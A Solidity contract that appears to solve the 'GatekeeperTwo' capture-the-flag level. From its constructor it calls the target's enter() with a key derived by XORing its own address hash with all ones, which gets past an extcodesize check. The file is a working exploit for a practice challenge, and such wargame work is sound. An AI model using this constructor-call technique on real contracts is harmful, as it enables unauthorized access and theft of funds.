// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo public challenge;

    constructor(address _challengeAddr) public {
        challenge = GatekeeperTwo(_challengeAddr);
        // bytes8 _gateKey = bytes8(
        //     uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
        //         (uint64(0) - 1)
        // );
        // challenge.enter(_gateKey);

        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
            (uint64(0) - 1);
        challenge.enter(bytes8(gateKey));
    }

    // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ (uint64(0) - 1) == uint64(_gateKey)
    // // uint64(_gateKey) = uint64(keccak256(msg.sender)) ^ uint64(0) — 1)
}
